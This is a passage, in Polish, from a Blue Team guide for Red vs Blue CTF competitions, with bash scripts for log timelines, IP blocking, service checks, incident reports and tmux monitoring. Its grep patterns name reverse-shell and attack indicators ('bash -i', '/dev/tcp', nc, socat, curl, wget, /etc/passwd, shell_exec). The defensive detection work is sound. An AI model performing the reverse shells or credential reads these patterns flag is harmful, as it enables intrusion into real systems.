  if [ "$uid" -ge 1000 ] 2>/dev/null || [ "$uid" -eq 0 ] 2>/dev/null; then
    sudo passwd -S "$user" 2>/dev/null || true
  fi
done < /etc/passwd
```

Uruchomienie:

```bash
chmod +x audit_users.sh
./audit_users.sh
```

---

## 15.11. Skrypt: utworzenie timeline z logów web i SSH

Nazwa pliku: `quick_timeline.sh`

Zastosowanie:

- zbiera istotne zdarzenia z logów SSH i web,
- tworzy prosty plik timeline,
- nie zastępuje analizy ręcznej, ale przyspiesza pracę.

```bash
#!/usr/bin/env bash
set -euo pipefail

OUT_DIR="${1:-$HOME/ctf-blue/reports}"
TS="$(date +%Y%m%d_%H%M%S)"
OUT="$OUT_DIR/timeline_$TS.txt"
mkdir -p "$OUT_DIR"

{
  echo "# Quick timeline"
  echo "Generated: $(date -Is)"
  echo

  if [ -f /var/log/auth.log ]; then
    echo "== SSH/Auth events =="
    sudo grep -Ei "Failed password|Invalid user|Accepted password|Accepted publickey|sudo:|session opened|session closed" /var/log/auth.log | tail -200 || true
    echo
  fi

  if [ -f /var/log/nginx/access.log ]; then
    echo "== Nginx suspicious requests =="
    sudo grep -Ei "cmd=|whoami|/etc/passwd|\.env|\.git|union|select|base64|shell|wget|curl|/tmp|/dev/shm" /var/log/nginx/access.log | tail -200 || true
    echo
  fi

  if [ -f /var/log/apache2/access.log ]; then
    echo "== Apache suspicious requests =="
    sudo grep -Ei "cmd=|whoami|/etc/passwd|\.env|\.git|union|select|base64|shell|wget|curl|/tmp|/dev/shm" /var/log/apache2/access.log | tail -200 || true
    echo
  fi

  echo "== Active network connections =="
  sudo ss -tunap || true
  echo

  echo "== Suspicious processes =="
  ps auxww | grep -Ei "bash -i|/dev/tcp|nc |ncat|socat|python -c|perl -e|php -r|wget |curl " | grep -v grep || true
} > "$OUT"

echo "Timeline zapisany w: $OUT"
```

Uruchomienie:

```bash
chmod +x quick_timeline.sh
./quick_timeline.sh
```

---

## 15.12. Skrypt: bezpieczne blokowanie IP z komentarzem

Nazwa pliku: `block_ip.sh`

Zastosowanie:

- blokuje adres IP przez UFW,
- zapisuje wpis do lokalnego dziennika działań Blue Teamu,
- wymaga jawnego podania adresu IP.

```bash
#!/usr/bin/env bash
set -euo pipefail

IP="${1:-}"
REASON="${2:-CTF suspicious activity}"
LOG="$HOME/ctf-blue/reports/actions.log"

if [ -z "$IP" ]; then
  echo "Użycie: $0 <IP> [powód]"
  exit 1
fi

if ! [[ "$IP" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
  echo "To nie wygląda jak IPv4: $IP"
  exit 1
fi

mkdir -p "$(dirname "$LOG")"

echo "Blokuję IP: $IP"
sudo ufw deny from "$IP"

echo "$(date -Is) BLOCK_IP ip=$IP reason=$REASON" >> "$LOG"
echo "Zapisano akcję w: $LOG"
```

Uruchomienie:

```bash
chmod +x block_ip.sh
./block_ip.sh 192.0.2.50 "reverse shell"
```

Uwaga: w zawodach należy uważać, żeby nie zablokować adresu systemu scoringowego, organizatora lub własnej infrastruktury.

---

## 15.13. Skrypt: sprawdzanie dostępności usługi punktowanej

Nazwa pliku: `service_check.sh`

Zastosowanie:

- sprawdza lokalnie odpowiedź HTTP,
- zapisuje wynik do logu,
- przydatne po każdej zmianie konfiguracji.

```bash
#!/usr/bin/env bash
set -euo pipefail

URL="${1:-http://127.0.0.1/}"
LOG="$HOME/ctf-blue/reports/service_check.log"
mkdir -p "$(dirname "$LOG")"

TS="$(date -Is)"
CODE="$(curl -k -s -o /dev/null -w '%{http_code}' --max-time 5 "$URL" || echo '000')"
TIME="$(curl -k -s -o /dev/null -w '%{time_total}' --max-time 5 "$URL" || echo 'timeout')"

echo "$TS url=$URL http_code=$CODE time=$TIME" | tee -a "$LOG"

if [ "$CODE" = "200" ] || [ "$CODE" = "301" ] || [ "$CODE" = "302" ]; then
  exit 0
else
  exit 2
fi
```

Uruchomienie:

```bash
chmod +x service_check.sh
./service_check.sh http://127.0.0.1/health.php
```

---

## 15.14. Skrypt: prosty generator raportu incydentu

Nazwa pliku: `new_incident_report.sh`

Zastosowanie:

- tworzy szablon raportu incydentu w Markdown,
- ułatwia szybkie dokumentowanie działań.

```bash
#!/usr/bin/env bash
set -euo pipefail

OUT_DIR="${1:-$HOME/ctf-blue/reports}"
TS="$(date +%Y%m%d_%H%M%S)"
OUT="$OUT_DIR/incident_$TS.md"
mkdir -p "$OUT_DIR"

cat > "$OUT" <<REPORT
# Raport incydentu - Blue Team

## 1. Dane podstawowe

- Data i czas wykrycia: $(date -Is)
- Osoba/Zespół:
- Dotknięta usługa:
- Status usługi po incydencie:

## 2. Źródło wykrycia

- [ ] auth.log
- [ ] access.log
- [ ] error.log
- [ ] procesy
- [ ] połączenia sieciowe
- [ ] monitoring
- [ ] inne:

## 3. Opis incydentu

Krótki opis:


## 4. Adres IP / host atakującego

- IP:
- Porty:
- Inne identyfikatory:

## 5. Wektor wejścia

- [ ] SSH brute force
- [ ] podatność web
- [ ] upload pliku
- [ ] command injection
- [ ] błędna konfiguracja
- [ ] inne:

Szczegóły:


## 6. Dowody

Wklej fragmenty logów, komendy, wyniki:

\`\`\`text

\`\`\`

## 7. Podjęte działania

- [ ] zablokowano IP
- [ ] zabito proces
- [ ] zablokowano konto
- [ ] usunięto webshell
- [ ] usunięto persistence
- [ ] poprawiono konfigurację
- [ ] sprawdzono usługę

Szczegóły:


## 8. Persistence

Czy wykryto persistence?

- [ ] nie
- [ ] tak

Opis:


## 9. Status końcowy

- Czy usługa działa?
- Czy podatność usunięta?
- Czy atakujący nadal ma dostęp?
- Co wymaga dalszej analizy?

## 10. Rekomendacje

- 
REPORT

echo "Utworzono raport: $OUT"
```

Uruchomienie:

```bash
chmod +x new_incident_report.sh
./new_incident_report.sh
```

---

## 15.15. Skrypt: uruchomienie kilku watcherów w tmux

Nazwa pliku: `blue_tmux.sh`

Zastosowanie:

- uruchamia panele tmux dla logów, procesów, połączeń i testu usługi,
- przydatne na początku rundy.

Wymaganie:

```bash
sudo apt install tmux
```

Skrypt:

```bash
#!/usr/bin/env bash
set -euo pipefail

SESSION="blue"
URL="${1:-http://127.0.0.1/}"

if tmux has-session -t "$SESSION" 2>/dev/null; then
  echo "Sesja tmux '$SESSION' już istnieje. Dołącz: tmux attach -t $SESSION"
  exit 0
fi

tmux new-session -d -s "$SESSION" -n logs

tmux send-keys -t "$SESSION:logs" 'sudo tail -F /var/log/auth.log 2>/dev/null' C-m

tmux split-window -h -t "$SESSION:logs"
tmux send-keys -t "$SESSION:logs.1" 'sudo tail -F /var/log/nginx/access.log /var/log/apache2/access.log 2>/dev/null' C-m

tmux new-window -t "$SESSION" -n net
tmux send-keys -t "$SESSION:net" 'watch -n 2 "ss -tunap | head -80"' C-m

tmux split-window -h -t "$SESSION:net"
tmux send-keys -t "$SESSION:net.1" 'watch -n 2 "ps auxf | grep -Ei '\''www-data|apache|nginx|bash|sh|nc|socat|python|perl|php'\'' | grep -v grep"' C-m

tmux new-window -t "$SESSION" -n service
tmux send-keys -t "$SESSION:service" "watch -n 5 'curl -k -s -o /dev/null -w \"%{http_code} %{time_total}\\n\" --max-time 5 $URL'" C-m

tmux attach -t "$SESSION"
```

Uruchomienie:

```bash
chmod +x blue_tmux.sh
./blue_tmux.sh http://127.0.0.1/health.php
```

---

# 16. Najczęstsze błędy Blue Teamu

1. Brak notatek i timeline.
2. Restartowanie usług bez zrozumienia przyczyny.
3. Kasowanie dowodów bez kopii.
4. Blokowanie zbyt szerokiego ruchu.
5. Zablokowanie systemu scoringowego.
6. Wyłączenie usługi punktowanej.
7. Skupienie się tylko na jednym logu.
8. Brak sprawdzenia persistence.
9. Brak testów po zmianach.
10. Brak komunikacji w zespole.

---

# 17. Najczęstsze błędy Red Teamu

1. Brak dokumentacji ścieżki ataku.
2. Zbyt agresywne skanowanie.
3. Niszczenie usługi zamiast kontrolowanego działania.
4. Używanie przypadkowych payloadów bez zrozumienia.
5. Brak planu po pierwszym wejściu.
6. Pozostawianie oczywistych artefaktów.
7. Brak znajomości scoringu.
8. Brak synchronizacji w zespole.

---

# 18. Minimalny zestaw komend Blue Teamu

```bash
# SSH i logowania
sudo tail -f /var/log/auth.log
sudo grep "Failed password" /var/log/auth.log
sudo grep "Accepted" /var/log/auth.log
last -a | head -30

# Logi web
sudo tail -f /var/log/nginx/access.log
sudo tail -f /var/log/apache2/access.log
sudo grep -Ei "cmd=|select|union|passwd|shell|\.env|\.git" /var/log/nginx/access.log
sudo grep -Ei "cmd=|select|union|passwd|shell|\.env|\.git" /var/log/apache2/access.log

# Procesy
ps auxf
pstree -ap

# Sieć
ss -tunap
sudo lsof -i -n -P

# Webshelle
sudo find /var/www -type f -mtime -1 -ls
sudo grep -R "shell_exec\|passthru\|system\|eval\|base64_decode" /var/www

# Persistence
sudo crontab -l
sudo ls -la /etc/cron.*
sudo grep -R "bash\|nc\|curl\|wget" /etc/cron* /var/spool/cron 2>/dev/null
sudo find /etc/systemd/system -type f -mtime -2 -ls
sudo find /home /root -name authorized_keys -exec ls -la {} \;

# Użytkownicy i sudo
cat /etc/passwd
sudo awk -F: '$3 == 0 {print}' /etc/passwd
getent group sudo
getent group docker
sudo grep -R "NOPASSWD" /etc/sudoers /etc/sudoers.d/

# Sprawdzenie usługi
curl -I http://127.0.0.1
systemctl status nginx
systemctl status apache2
```

---

# 19. Podsumowanie

W zawodach Red vs Blue skuteczny Blue Team nie działa przypadkowo. Najważniejsze są:

- szybka orientacja w systemie,
- monitorowanie logów,
- korelacja zdarzeń,
- kontrola procesów i połączeń,
- sprawdzanie persistence,
- utrzymanie działania usług,
- dokumentowanie timeline,
- raportowanie oparte na dowodach.

Najważniejsza zasada: **nie wystarczy zabić procesu lub usunąć webshella**. Trzeba ustalić, jak atakujący wszedł, czy zostawił alternatywny dostęp i czy podatność została usunięta.

